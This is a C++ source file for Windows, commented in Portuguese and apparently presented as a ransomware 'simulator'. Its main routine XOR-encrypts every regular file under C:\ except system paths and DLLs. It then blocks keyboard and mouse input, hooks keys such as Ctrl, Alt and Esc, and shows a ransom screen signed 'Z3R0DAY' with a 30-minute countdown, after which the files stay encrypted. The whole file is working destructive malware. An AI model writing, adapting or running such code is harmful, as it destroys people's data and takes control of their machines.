#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <atomic>
#include <windows.h> 

namespace fs = std::filesystem;

// --- MÓDULO 1: ESTADOS DO SISTEMA ---
enum class AppState {
    WAITING_FOR_PASSWORD,
    DECRYPTING,
    LOCKED_PERMANENTLY,
    SUCCESS
};

// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA ---
class CryptoEngine {
private:
    char key; 

public:
    CryptoEngine(std::string password) {
        key = password.empty() ? 'a' : password[0];
    }

    void processFile(const fs::path& filePath, bool encrypt) {
        try {
            std::ifstream inFile(filePath, std::ios::binary);
            if (!inFile) return;

            std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
            inFile.close();

            if (buffer.empty()) return;

            for (size_t i = 0; i < buffer.size(); i++) {
                buffer[i] ^= key; 
            }

            std::ofstream outFile(filePath, std::ios::binary);
            if (!outFile) return;
            outFile.write(buffer.data(), buffer.size());
            outFile.close();
        } catch (...) { }
    }
};

// --- MÓDULO 3: SCANNER DE ARQUIVOS (VERSÃO FINAL CORRIGIDA) ---
class FileScanner {
private:
    CryptoEngine& engine;

public:
    FileScanner(CryptoEngine& ce) : engine(ce) {}

    void scanAndProcess(const std::string& targetDir, bool encrypt) {
        if (!fs::exists(targetDir)) return;

        try {
            // O segredo está no directory_options para ignorar erros de permissão
            for (const auto& entry : fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied)) {
                try {
                    // Verifica se o arquivo é válido e é um arquivo regular
                    if (fs::is_regular_file(entry.path())) {
                        std::string pathStr = entry.path().string();

                        // Filtros de Segurança
                        if (pathStr.find("Windows") != std::string::npos || 
                            pathStr.find("simulador.exe") != std::string::npos) continue;

                        if (pathStr.find(".sys") != std::string::npos || 
                            pathStr.find(".dll") != std::string::npos) continue;

                        engine.processFile(entry.path(), encrypt);
                    }
                } catch (const std::exception& e) {
                    // Se um arquivo der erro, ele apenas pula para o próximo
                    continue; 
                }
            }
        } catch (const std::exception& e) {
            // Captura erros do iterador principal (como o invalid_argument)
        }
    }
};

// --- MÓDULO 4: CORE (TIMER E CONTROLE) ---
class RansomwareCore {
private:
    std::atomic<int> timeLeft; 
    std::atomic<AppState> currentState;
    const int INITIAL_TIME = 30 * 60; 

public:
    RansomwareCore() : timeLeft(INITIAL_TIME), currentState(AppState::WAITING_FOR_PASSWORD) {}

    void startTimer() {
        while (timeLeft > 0 && currentState == AppState::WAITING_FOR_PASSWORD) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            timeLeft--;
            if (timeLeft <= 0) currentState = AppState::LOCKED_PERMANENTLY;
        }
    }

    void checkPassword(std::string input) {
        if (currentState == AppState::LOCKED_PERMANENTLY) return;
        if (input == "batata") currentState = AppState::DECRYPTING;
        else std::cout << "\n[!] SENHA INCORRETA!\n";
    }

    AppState getState() const { return currentState.load(); }
    int getTime() const { return timeLeft.load(); }
};

// --- MÓDULO 5: INTERFACE (CORES E ARTE ASCII) ---
class Renderer {
private:
    void setTextColor(int color) {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
    }

public:
    void renderUI(const RansomwareCore& core) {
        system("cls"); 

        // Arte ASCII
        setTextColor(12); // Vermelho Brilhante
        std::cout << "\n\n";
        std::cout << " //                                               \n";
        std::cout << " //     _____ _____ _____ _____ _____ ____        \n";
        std::cout << " //    |  |  |  _  |     |  |  |   __|    \\       \n";
        std::cout << " //    |     |     |   --|    -|   __|  |  |      \n";
        std::cout << " //    |__|__|__|__|_____|__|__|_____|____/       \n";
        std::cout << " //                                               \n";
        std::cout << " //                                               \n";
        std::cout << " //     _____ __ __                               \n";
        std::cout << " //    | __  |  |  |                              \n";
        std::cout << " //    | __ -|_   _|                              \n";
        std::cout << " //    |_____| |_|                                \n";
        std::cout << " //                                               \n";
        std::cout << " //                                               \n";
        std::cout << " //     _____ _____ _____ _____ ____  _____ __ __ \n";
        std::cout << " //    |__   |   __| __  |     |    \\|  _  |  |  | \n";
        std::cout << " //    |   __|   __|    -|  |  |  |  |     |_   _| \n";
        std::cout << " //    |_____|_____|__|__|_____|____/|__|__| |_|  \n";
        std::cout << " //                                               \n";

        std::cout << "\n====================================================\n";
        std::cout << "        [SISTEMA TOTALMENTE BLOQUEADO]              \n";
        std::cout << "====================================================\n";
        
        setTextColor(12); 
        std::cout << "\n    [AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
        
        setTextColor(7); 
        std::cout << "----------------------------------------------------\n";
        std::cout << "  TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.       \n";
        std::cout << "  O TEMPO ESTA CORRENDO. NAO TENTE FECHAR O SISTEMA. \n";
        std::cout << "----------------------------------------------------\n";

        if (core.getState() == AppState::LOCKED_PERMANENTLY) {
            setTextColor(4); 
            std::cout << "\n    [!!!] TEMPO ESGOTADO! ACESSO PERMANENTE NEGADO [!!!]\n";
        } else {
            int mins = core.getTime() / 60;
            int secs = core.getTime() % 60;
            std::cout << "\n    Tempo restante: " << mins << ":" << (secs < 10 ? "0" : "") << "\n";
            std::cout << "    Digite a senha para descriptografar: ";
        }
        
        setTextColor(7); 
    }
};

// --- MÓDULO 6: HOOK DE TECLADO (O BLOQUEADOR) ---
HHOOK hhkKeyboard = NULL;

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == 0) { 
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;

        if (pKeyBoard->vkCode == VK_CONTROL || pKeyBoard->vkCode == VK_MENU || 
            pKeyBoard->vkCode == VK_SHIFT || pKeyBoard->vkCode == VK_TAB || 
            pKeyBoard->vkCode == VK_ESCAPE || (pKeyBoard->scanCode >= VK_F1 && pKeyBoard->scanCode <= VK_F12)) {
            return 1; 
        }
    }
    return CallNextHookEx(hhkKeyboard, nCode, wParam, lParam);
}

// --- MÓDULO 7: MAIN (O ORQUESTRADOR FINAL) ---
int main() {
    std::string pastaAlvo = "C:\\"; 
    std::string senhaCorreta = "batata";
    
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    RansomwareCore core;
    CryptoEngine engine(senhaCorreta);
    FileScanner scanner(engine);
    Renderer renderer;

    std::cout << "--- INICIALIZANDO SISTEMA DE TESTE ---\n";
    std::cout << "Alvo: " << pastaAlvo << "\n";
    std::cout << "Aguarde a preparacao...\n";

    scanner.scanAndProcess(pastaAlvo, true); 
    std::cout << "[!] Criptografia concluida.\n";

    BlockInput(TRUE); 

    hhkKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);

    std::thread timerThread(&RansomwareCore::startTimer, &core);

    while (core.getState() != AppState::SUCCESS && core.getState() != AppState::LOCKED_PERMANENTLY) {
        renderer.renderUI(core);

        std::string input;
        std::cin >> input;

        if (core.getState() == AppState::WAITING_FOR_PASSWORD) {
            core.checkPassword(input);
            
            if (core.getState() == AppState::DECRYPTING) {
                std::cout << "\n[!] Senha aceita. Iniciando DESCRIPTOGRAFIA...\n";
                scanner.scanAndProcess(pastaAlvo, false); 
                std::cout << "[!] SUCESSO! Arquivos recuperados.\n";
                break; 
            }
        }

        if (core.getTime() < 1) break; 
    }

    // Limpeza
    UnhookWindowsHookEx(hhkKeyboard);
    BlockInput(FALSE); 

    if (core.getState() == AppState::LOCKED_PERMANENTLY) {
        std::cout << "\n[!] SISTEMA TRAVADO. O TEMPO ACABOU.\n";
    }

    timerThread.join();
    return 0;
}
